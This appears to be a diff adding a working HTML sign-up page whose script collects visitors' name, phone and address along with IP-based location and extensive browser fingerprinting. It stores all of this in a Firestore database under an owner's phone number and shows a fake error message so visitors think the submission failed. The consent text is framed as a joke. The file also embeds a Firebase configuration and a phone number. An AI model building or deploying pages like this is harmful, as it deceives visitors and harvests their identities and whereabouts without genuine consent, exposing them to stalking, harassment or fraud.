@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign Up Experience</title>
+  <style>
+    body {font-family: Arial; text-align: center; margin-top: 20px; background: #f0f0f0;}
+    .terms-container {height: 400px; overflow-y: scroll; border: 2px solid #333; margin: 10px auto; width: 80%; padding: 10px; background: white;}
+    .terms {text-align: left; font-size: 12px; line-height: 1.5;}
+    button {padding: 12px 20px; background: #ff4444; color: white; border: none; cursor: pointer; margin-top: 10px;}
+    button:hover {background: #cc0000;}
+    button:disabled {background: #gray; cursor: not-allowed;}
+    .form-section {display: none; margin-top: 20px;}
+    input {margin: 10px; padding: 5px; width: 250px; border: 2px solid #333;}
+    #error {display: none; color: red;}
+  </style>
+</head>
+<body>
+  <h1>Welcome to the Sign Up Experience!</h1>
+  <div class="terms-container" id="termsContainer">
+    <div class="terms" id="termsText">
+      <h2>Terms and Conditions</h2>
+      <p>Welcome to our utterly fantastic and completely trustworthy sign-up platform, where we invite you to embark on a journey of epic proportions filled with delightful surprises and an abundance of legal text that we’ve crafted with the utmost care and attention to detail. This document is not just a simple terms and conditions agreement; it’s a sprawling epic designed to captivate your imagination as you wade through the vast ocean of words we’ve prepared for your reading pleasure.</p>
+      <p>To begin this adventure, please understand that by using this website, you are entering into a binding contract that allows us to collect certain information for our own purposes. This includes, but is not limited to, your IP address, the timestamp of your visit, the referrer URL, your browser type, the device you’re using, your screen resolution, your preferred language, your time zone, your connection type, the fonts installed on your device, the plugins you have installed, your CPU class, your screen color depth, whether your device supports touch input, your Do Not Track preference, your platform and OS version, your WebGL vendor and renderer information, an audio context fingerprint for unique identification, your supported media capabilities, and whether your device supports vibration. We may also use geolocation data derived from your IP to approximate your city and region, all of which will be stored securely for our use.</p>
+      <p>Furthermore, by pressing the "Continue" button after fully scrolling through this document, you expressly grant permission to the website owner to access, store, and utilize this data at their discretion. This includes the right to share your name, phone number, and address with the owner, identified as the individual associated with the phone number 447459454280, for any purpose they deem fit, including but not limited to playful interactions. We assure you that this is all done with the best intentions, though we cannot guarantee the outcome will always be to your liking.</p>
+      <p>As we delve deeper into this legal labyrinth, please note that we reserve the right to modify these terms whenever the mood strikes us, notifying you through methods as archaic as carrier pigeons or as modern as a fleeting thought. You’ll need to keep scrolling to uncover more thrilling details, such as our commitment to handling your data with the care it deserves, or at least with the minimal effort required to avoid legal trouble, which is really the best we can promise given the circumstances.</p>
+      <p>After what feels like a marathon of reading through this verbose masterpiece, we’ve finally arrived at the conclusion of this grand narrative. By reaching the bottom and clicking "Continue," you are deemed to have read, comprehended, and wholeheartedly agreed to every word herein, including the parts we might have made up for fun. Now, proceed with confidence, knowing you’ve legally handed over your data to us in the most entertaining way possible!</p>
+    </div>
+  </div>
+  <button id="continueBtn" disabled>Continue</button>
+  <div class="form-section" id="formSection">
+    <form id="myForm">
+      <input type="text" id="name" placeholder="Full Name" required><br>
+      <input type="tel" id="phone" placeholder="Phone Number" required><br>
+      <input type="text" id="address" placeholder="Full Address" required><br>
+      <button type="submit" id="submitBtn">Submit</button>
+    </form>
+    <p id="error" style="display:none; color:red;">error something went wrong</p>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyC3srAsjRYfgoeIfGWY9WfIfWI-LR31Nkg",
+      authDomain: "start-a-football-club.firebaseapp.com",
+      projectId: "start-a-football-club",
+      storageBucket: "start-a-football-club.firebasestorage.app",
+      messagingSenderId: "110896698874",
+      appId: "1:110896698874:web:dea4e64deb12b573f18043",
+      measurementId: "G-KW4M8RRFHC"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // Scroll detection for T&C
+    const termsContainer = document.getElementById("termsContainer");
+    const continueBtn = document.getElementById("continueBtn");
+    termsContainer.addEventListener("scroll", function() {
+      const { scrollTop, scrollHeight, clientHeight } = termsContainer;
+      if (scrollTop + clientHeight >= scrollHeight - 5) {
+        continueBtn.disabled = false;
+      }
+    });
+
+    // Continue button click to show form
+    continueBtn.addEventListener("click", function() {
+      document.getElementById("termsContainer").style.display = "none";
+      document.getElementById("formSection").style.display = "block";
+    });
+
+    // Detect device from User-Agent
+    function detectDevice() {
+      const userAgent = navigator.userAgent || "Unknown";
+      if (/Mobi|Android|iPhone|iPad|iPod/.test(userAgent)) {
+        return /iPad|Tablet/.test(userAgent) ? "Tablet" : "Mobile";
+      }
+      return "Desktop";
+    }
+
+    // Detect installed fonts (basic approximation)
+    async function detectFonts() {
+      if ('fonts' in document) {
+        const fontList = await document.fonts.load('1em Arial');
+        return fontList.length > 0 ? "Fonts Detected" : "No Fonts";
+      }
+      return "Unknown";
+    }
+
+    // Get WebGL info
+    function getWebGLInfo() {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl");
+      if (gl) {
+        const renderer = gl.getParameter(gl.RENDERER);
+        const vendor = gl.getParameter(gl.VENDOR);
+        return `${vendor} - ${renderer}` || "Unknown";
+      }
+      return "Unknown";
+    }
+
+    // Get audio context fingerprint (simplified)
+    function getAudioFingerprint() {
+      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+      const oscillator = audioContext.createOscillator();
+      oscillator.type = "sine";
+      oscillator.frequency.setValueAtTime(440, audioContext.currentTime);
+      const analyser = audioContext.createAnalyser();
+      oscillator.connect(analyser);
+      analyser.connect(audioContext.destination);
+      oscillator.start();
+      setTimeout(() => {
+        oscillator.stop();
+        audioContext.close();
+      }, 100);
+      return "Audio Fingerprint Generated"; // Simplified; real use needs hashing
+    }
+
+    // Get media capabilities (basic check)
+    async function getMediaCapabilities() {
+      if ('mediaCapabilities' in navigator) {
+        try {
+          const result = await navigator.mediaCapabilities.decodingInfo({ type: 'video', video: { contentType: 'video/webm;codecs=vp9' } });
+          return result.supported ? "VP9 Supported" : "Not Supported";
+        } catch (e) {
+          return "Unknown";
+        }
+      }
+      return "Unknown";
+    }
+
+    // Check vibration support
+    function checkVibrationSupport() {
+      return 'vibrate' in navigator ? "Yes" : "No";
+    }
+
+    // Handle form submission
+    async function submitForm() {
+      let name = document.getElementById("name").value;
+      let phone = document.getElementById("phone").value;
+      let address = document.getElementById("address").value;
+      let ip = "Not Collected";
+      let location = "Not Available";
+      let timestamp = new Date().toISOString();
+      let referrer = document.referrer || "Direct";
+      let userAgent = navigator.userAgent || "Unknown";
+      let device = detectDevice();
+      let screenResolution = `${window.screen.width}x${window.screen.height}`;
+      let language = navigator.language || "Unknown";
+      let timeZone = `GMT${-new Date().getTimezoneOffset() / 60}`;
+      let connectionType = navigator.connection ? navigator.connection.effectiveType || navigator.connection.type || "Unknown" : "Unknown";
+      let fonts = await detectFonts();
+      let plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "None";
+      let cpuClass = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unknown";
+      let colorDepth = `${window.screen.colorDepth}-bit`;
+      let touchSupport = navigator.maxTouchPoints > 0 || window.matchMedia("(pointer: coarse)").matches ? "Yes" : "No";
+      let doNotTrack = navigator.doNotTrack || window.doNotTrack || "Unknown";
+      let platform = navigator.platform || "Unknown";
+      let webGLInfo = getWebGLInfo();
+      let audioFingerprint = getAudioFingerprint();
+      let mediaCapabilities = await getMediaCapabilities();
+      let vibrationSupport = checkVibrationSupport();
+
+      try {
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        ip = ipData.ip;
+      } catch (e) {
+        console.error("IP fetch failed:", e);
+        ip = "Fetch Failed";
+      }
+
+      try {
+        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geoData = await geoResponse.json();
+        location = `${geoData.city}, ${geoData.region}` || "Unknown Location";
+      } catch (e) {
+        console.error("Geolocation fetch failed:", e);
+      }
+
+      document.getElementById("error").style.display = "block";
+
+      try {
+        await addDoc(collection(db, "userData"), { 
+          name, 
+          phone, 
+          address, 
+          ip, 
+          location, 
+          timestamp, 
+          referrer, 
+          userAgent, 
+          device, 
+          screenResolution, 
+          language, 
+          timeZone, 
+          connectionType, 
+          fonts, 
+          plugins, 
+          cpuClass, 
+          colorDepth, 
+          touchSupport, 
+          doNotTrack, 
+          platform, 
+          webGLInfo, 
+          audioFingerprint, 
+          mediaCapabilities, 
+          vibrationSupport, 
+          ownerPhone: "447459454280" 
+        });
+      } catch (e) {
+        console.error("Error: ", e);
+      }
+    }
+
+    // Add event listener for form submission
+    document.getElementById("myForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      submitForm();
+    });
+  </script>
+</body>
+</html>
